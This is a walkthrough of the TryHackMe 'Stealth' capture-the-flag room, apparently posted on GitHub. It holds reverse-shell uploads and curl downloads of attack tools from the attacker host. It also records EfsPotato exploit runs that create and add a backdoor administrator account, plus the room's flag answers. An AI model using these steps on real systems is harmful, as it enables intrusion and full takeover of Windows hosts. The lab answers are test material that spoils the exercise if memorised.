<h1 align="center">Stealth</h1>
<p align="center">2025, August 22<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>473</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Use your evasion skills to pwn a Windows target with an updated defence mechanism.</em><br>
<img width="80px" src="https://github.com/user-attachments/assets/b86e9ee2-ef95-4bda-8a45-78ed6b98cf44"><br>
Access this TryHackMe´s walkthrough <a href="https://tryhackme.com/room/stealth">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/be25c468-7493-49e9-9f4c-b80b26e45157"></p>

<br>
<h2>Task 1 . Stealth</h2>
<p>Start the VM by clicking the <code>Start Machine</code> button at the top right of the task and visit <code>xx.xxx.xxx.xxx:8080</code> to pwn the machine. You can complete the challenge by connecting through VPN or the AttackBox containing all the essential tools.

<p>Are you stealthier enough to evade all the updated security measures of the target?</p>

<p><em>Answer the questions below</em></p>

<br>
<h3>/etc/hosts</h3>

```bash
xx.xxx.xxx.xx stealth.thm
```

<h3>Nmap</h3>

```bash
:~/Stealth# nmap -sT -Pn stealth.thm
...
PORT     STATE SERVICE
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8000/tcp open  http-alt
8080/tcp open  http-proxy
8443/tcp open  https-alt
```


```bash
:~/Stealth# nmap -sC -sV -sT -Pn -p- stealth.thm
...
PORT      STATE SERVICE       VERSION
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HOSTEVASION
|   NetBIOS_Domain_Name: HOSTEVASION
|   NetBIOS_Computer_Name: HOSTEVASION
|   DNS_Domain_Name: HostEvasion
|   DNS_Computer_Name: HostEvasion
|   Product_Version: 10.0.17763
|_  System_Time: 2025-08-22Txx:xx:xx+00:00
| ssl-cert: Subject: commonName=HostEvasion
| Not valid before: 2025-08-21Txx:xx:xx
|_Not valid after:  2026-02-20Txx:xx:xx
|_ssl-date: 2025-08-22Txx:xx:xx+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8000/tcp  open  http          PHP cli server 5.5 or later
|_http-title: 404 Not Found
8080/tcp  open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-title: PowerShell Script Analyser
8443/tcp  open  ssl/ssl       Apache httpd (SSL-only mode)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-title: PowerShell Script Analyser
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10Txx:xx:xx
|_Not valid after:  2019-11-08Txx:xx:xx
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
|_nbstat: NetBIOS name: HOSTEVASION, NetBIOS user: <unknown>, NetBIOS MAC: xx:xx:xx:xx:xx:xx (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-08-22Txx:xx:xx
|_  start_date: N/A
```

<h3>Web port 8080</h3>

<img width="1131" height="477" alt="image" src="https://github.com/user-attachments/assets/43c85fc3-5a06-4f78-9c9c-43c091760bb2" />

<br>
<br>
<h3>PowerShell Reverse Shell</h3>

<p>

- researched for <code>GitHub PowerShell Reverse Shell</code><br>
- navigated to <code>https://github.com/martinsohn/PowerShell-reverse-shell</code><br>
- downloaded <code>powershell-reverse-shell.ps1</code><br>
- updated the IP<br>
- set up a listener<br>
- navigated to <code>stealth.com:8080</code><br>
- browsed and uploaded <code>powershell-reverse-shell.ps1</code></p>

<br>

<img width="1204" height="744" alt="image" src="https://github.com/user-attachments/assets/de58dddd-dc69-4349-9b30-4ea609002555" />

<br>
<br>
<h3>User level flag</h3>
<p>
 
- discovered <code>encodedflag</code> file in <code>evader</code>´s Desktop<br>
- inspected its content<br>
- Base64 dedcoded it<br>
- navigated to <code>stealth.com:8080/asdasdadas ... .php</code><br>
- checked <code>file.ps1</code>´s content<br>
- identified <code>C:\xampp\htdocs\uploads</code><br>
- deleted its <code>log.txt</code> file considering the message in the web page<br>
- refreshed the web page<br>
- uncovered user level flag</p>

<br>

<img width="1194" height="472" alt="image" src="https://github.com/user-attachments/assets/bde33e60-b6aa-4514-83e0-307025a1989a" />

<br>
<br>

<img width="1327" height="118" alt="image" src="https://github.com/user-attachments/assets/a557a453-c300-42a1-8d0d-0facecab49c4" />

<br>
<br>

<img width="1131" height="171" alt="image" src="https://github.com/user-attachments/assets/73401237-425d-479c-9a53-873160e7f86a" />

<br>
<br>

<img width="1324" height="471" alt="image" src="https://github.com/user-attachments/assets/4df22819-369a-446b-8092-8fdf7a0cac82" />

<br>
<br>

<img width="1302" height="328" alt="image" src="https://github.com/user-attachments/assets/c62deb8d-acb5-48cc-b2dd-f3d54fd4b5d8" />

<br>
<br>

<img width="1131" height="181" alt="image" src="https://github.com/user-attachments/assets/7721068c-44ac-4eae-8dfc-8f278858e31c" />

<br>
<br>

<p>1.1. What is the content of the user level flag?<br>
<code>THM{1010_EVASION_LOCAL_USER}</code></p>

<br>
<h3>Root level flag</h3>

<p>

- searched for <code>Windows Privilege Escalation Scanner</code><br>
- navigated to <code>https://github.com/itm4n/PrivescCheck</code><br>
- downloaded <code>PrivescCheck.ps1</code><br>
- set up an HTTP server<br>
- copied <code>PrivescCheck.ps1</code> to the Target executing: <code>curl http://xx.xxx.xxx.xx:8000/PrivescCheck.ps1 -o PrivescCheck.ps1</code><br>
- executed GitHub´s command line: <code>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"</code><br>
- it did not work<br>
- exited the session</p>

<br>

<img width="1118" height="75" alt="image" src="https://github.com/user-attachments/assets/c21921b1-6128-4a31-91d2-87e4e5f99b63" />

<br>
<br>

<img width="1301" height="184" alt="image" src="https://github.com/user-attachments/assets/db489732-8d4e-4e57-8a2d-59744ab8862a" />

<br>
<br>

<p>

- setup a listener<br>
- uploaded <code>powershell-reverse-shell.ps1</code> again<br>
- navigated to <code>C:\xampp\htdocs\uploads</code><br>
- executed: <code>powershell.exe</code><br>
- executed: <code>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"</code><br>
- waited ...<br>
- identified status: <code>Vulnerable - High</code>, Name: <code>Apache 2.4</code>, ImagePath: <code>"C:\xampp\apache\bin\httpd.exe"</code><br><br><br>
- searched for <code>GitHub Windows PHP Reverse Shell</code><br>
- navigated to <code>https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php</code><br>
- downloaded <code>php_reverse_shell.php</code><br>
- updated the IP<br>
- executed: <code>curl http://xx.xxx.xxx.xx:8000/php_reverse_shell.php -o php_reverse_shell.php</code><br>
- setup a listener<br>
- navigated to <code>stealth.com:8080/php_reverse_shell.php</code></p>

<br>
<br>

<img width="1127" height="314" alt="image" src="https://github.com/user-attachments/assets/f77d442d-13e6-4e47-ac37-97dbe9cc9601" />

<br>
<br>

<img width="1310" height="399" alt="image" src="https://github.com/user-attachments/assets/e94b9e79-e56c-4e6b-b195-14b3598d6d59" />

<br>
<br>

<img width="1126" height="80" alt="image" src="https://github.com/user-attachments/assets/de68918a-5748-4732-84b8-e43311de02ed" />

<br>
<br>


<p>Potato</p>


https://github.com/zcgonvh/EfsPotato
Downloaded EfsPotato.cs


C:\xampp\htdocs>C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe Potato.cs
Microsoft (R) Visual C# Compiler version 4.8.3761.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versio
...
C:\xampp\htdocs>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\xampp\htdocs

08/22/2025  08:40 PM    <DIR>          .
08/22/2025  08:40 PM    <DIR>          ..
08/17/2023  05:09 AM             5,024 6xK3dSBYKcSV-LCoeQqfX1RYOo3qNa7lqDY.woff2
07/16/2023  04:29 PM           213,642 background-image.jpg
07/11/2023  05:11 PM             9,711 background-image2.jpg
08/22/2025  08:28 PM               469 e.cs
08/22/2025  08:14 PM               469 EfsPotato.cs
08/17/2023  05:11 AM             3,554 font.css
08/29/2023  09:55 AM             3,591 index.php
08/22/2025  08:04 PM             9,407 php_reverse_shell.php
08/22/2025  08:39 PM            25,441 Potato.cs
08/22/2025  08:40 PM            17,920 Potato.exe
08/22/2025  08:04 PM    <DIR>          uploads
              10 File(s)        289,228 bytes
               3 Dir(s)  13,590,577,152 bytes free
...

C:\xampp\htdocs>Potato.exe "net user lili pass123& /add"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: HOSTEVASION\evader
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=c68df0)
[+] Get Token: 844
[!] process with pid: 3680 created.
==============================
The command completed successfully.


C:\xampp\htdocs>Potato.exe "net localgroup administrators lili /add"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: HOSTEVASION\evader
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=f3fb80)
[+] Get Token: 844
[!] process with pid: 1884 created.
==============================
The command completed successfully.


C:\xampp\htdocs>




<img width="1331" height="501" alt="image" src="https://github.com/user-attachments/assets/40b0d737-645e-4cfc-8662-1c21dfbc816c" />


C:\xampp\htdocs>Potato.exe "net localgroup administrators"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: HOSTEVASION\evader
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=b13690)
[+] Get Token: 844
[!] process with pid: 5548 created.
==============================
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
lili
The command completed successfully.


C:\xampp\htdocs>


<img width="1326" height="413" alt="image" src="https://github.com/user-attachments/assets/44f14cd1-ed20-4f62-a563-5786b5cc9a89" />


<br>
<br>

<h3>xfreerdp</h3>

:~/Stealth# xfreerdp /v:'10.201.124.246' /u:'lili' /p:'pass123&


<img width="814" height="600" alt="image" src="https://github.com/user-attachments/assets/4e3ecd0b-dbd8-4da2-87c0-2522370231e0" />

<br>

<br>

<img width="818" height="368" alt="image" src="https://github.com/user-attachments/assets/1ef66d38-13a7-4b77-a19d-71524c3c1ac6" />

<br>
<br>

<p>1.2. What is the content of the root level flag?<br>
<code>THM{101011_ADMIN_ACCESS}</code></p>

<br>

<br>
<br>
<br>
<br>

<img width="1901" height="885" alt="image" src="https://github.com/user-attachments/assets/0a57dfcc-e4b2-492f-8203-c56722d97188" />


<img width="1904" height="899" alt="image" src="https://github.com/user-attachments/assets/cdb35037-374d-44cd-9c2f-984dfcd6e8b0" />

<br>
<br>












